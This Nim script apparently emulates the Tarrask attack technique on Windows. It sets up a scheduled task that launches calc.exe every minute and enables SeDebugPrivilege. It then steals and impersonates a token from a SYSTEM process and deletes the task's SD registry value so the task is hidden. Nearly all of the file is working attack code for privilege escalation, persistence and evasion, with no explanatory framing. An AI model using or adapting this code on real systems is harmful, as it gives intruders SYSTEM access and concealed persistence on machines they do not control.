
# Create sch task
import osproc
echo "[+] Creating schtask:"
var lpCommandLine = "schtasks /create /tn tarrask_ /sc minute /mo 1 /tr c:\\windows\\system32\\calc.exe"
echo "\t|-> cmd:", lpCommandLine
let output = execProcess(lpCommandLine)



# Elevating to SYSTEM
import os
import winim
import winim/lean
import winim/inc/windef
import winim/inc/winbase
import winim/inc/objbase
# Source: https://github.com/itaymigdal/GetSystem/blob/master/GetSystem.nim
echo "[+] Checking for 'SeDebugPrivilege' in current process"

var hToken: HANDLE
# open current process token
discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)
var lpszPrivilege = "SeDebugPrivilege"
var luid: LUID 
 # get current privilege
var currentPrivilege = LookupPrivilegeValue(NULL, lpszPrivilege, &luid) 
if currentPrivilege == 0:
    quit(-1)

var tokenPriv: TOKEN_PRIVILEGES
# enable privilege
echo "\t|_ Enabeling SeDebugPrivilege"
tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
tokenPriv.PrivilegeCount = 1
tokenPriv.Privileges[0].Luid = luid
# set privilege
echo "\t|_ Setting SeDebugPrivilege"
var adjustedPriv = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL)
if adjustedPriv == 0:
    quit(-1)
# success
echo "[+] Successfully set 'SeDebugPrivilege' in current process"



echo "[+] Getting processes"
var entry: PROCESSENTRY32
var hSnapshot: HANDLE
entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)


proc convertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: "ConvertSidToStringSidA", dynlib: "Advapi32.dll".}

proc sidToString(sid: PSID): string =
    var lpSid: LPSTR
    discard convertSidToStringSidA(sid, addr lpSid)
    return $cstring(lpSid)

let systemSID = "S-1-5-18"

proc getProcessSID(pid: int): string =
    # inits
    var hProcess: HANDLE
    var hToken: HANDLE
    var pUser: TOKEN_USER
    var dwLength: DWORD
    var dwPid = cast[DWORD](pid)
    # open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid)
    defer: CloseHandle(hProcess)
    if hProcess == cast[DWORD](-1) or hProcess == cast[DWORD](NULL):
        return
    # open process token
    if OpenProcessToken(hProcess, TOKEN_QUERY, cast[PHANDLE](hToken.addr)) == FALSE:
        return
    if hToken == cast[HANDLE](-1) or hToken == cast[HANDLE](NULL):
        return
    # get required buffer size and allocate the TOKEN_USER buffer
    GetTokenInformation(hToken, tokenUser, cast[LPVOID](pUser.addr), cast[DWORD](0), cast[PDWORD](dwLength.addr))
    # extract token information
    GetTokenInformation(hToken, tokenUser, pUser.addr, cast[DWORD](dwLength), cast[PDWORD](dwLength.addr))
    # extract the SID from the token
    return sidToString(pUser.User.Sid)

# Get the current username via the GetUserName API
proc whoami*() : string =
    var 
        buf : array[257, TCHAR] # 257 is UNLEN+1 (max username length plus null terminator)
        lpBuf :  LPWSTR = addr buf[0]
        pcbBuf : DWORD = int32(len(buf))

    # The actual API call
    discard GetUserName(lpBuf, &pcbBuf)

    # Read the buffer into the function result
    for character in buf:
        if character == 0: break
        result.add(char(character))


from std/winlean import getLastError
proc dupicateAndExecute(pid: int): void =
    # inits
    var is_success: BOOL
    var hProcess: HANDLE
    var hToken: HANDLE
    var newToken: HANDLE
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION  
    echo "[*] Trying to duplicate process " & $pid & " token" 
    # open process
    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, pid.DWORD)
    defer: CloseHandle(hProcess)
    if hProcess == 0:
        echo "[-] Failed to open process handle: " & $getLastError()
        return
    # open process token
    is_success = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, addr hToken)
    if is_success == FALSE:
        echo "[-] Failed to open process token: "  & $getLastError()
        return
    # duplicate process token
    is_success = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nil, securityImpersonation, tokenPrimary, addr newToken)
    if bool(is_success) == FALSE:
        echo "[-] Failed to duplicate token:" & $getLastError()
        return
    # create SYSTEM process using the token
    si.cb = sizeof(si).DWORD

    echo "\t|_ Pre-impersonation user: ", whoami()
    ImpersonateLoggedOnUser(newToken)
    var post_user = whoami()
    echo "\t|_ Post-impersonation user: ", post_user
    if post_user == "SYSTEM":
        echo "\t\t|-> Impersonation successfull"
    
    # cleanup
    CloseHandle(newToken)
    CloseHandle(hToken)

echo "[+] Check first process"
if Process32First(hSnapshot, addr entry):
    echo "[+] Iterating through processes"
    # iterate all processes and try to steal token from each SYSTEM process
    while Process32Next(hSnapshot, addr entry):
        var pid: int = entry.th32ProcessID
        var sSid = getProcessSID(pid)
        echo "\t|_ pid: ", pid, " SID: ", sSid
        if sSid == systemSID:
            echo "\t\t|-> Found SYSTEM token"
            dupicateAndExecute(entry.th32ProcessID)
            break

echo "[+] Close handle for CreateToolhelp32Snapshot"
CloseHandle(hSnapshot)

# Wait
var wait = readLine(stdin)

# Delete SD value
echo "[+] Deleting the SD value for schtask"
var hKey: HKEY 
var lpValueName = "SD"
var status = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\tarrask_", REG_OPTION_OPEN_LINK, KEY_WRITE, &hKey)
RegDeleteValueA(hKey, lpValueName)
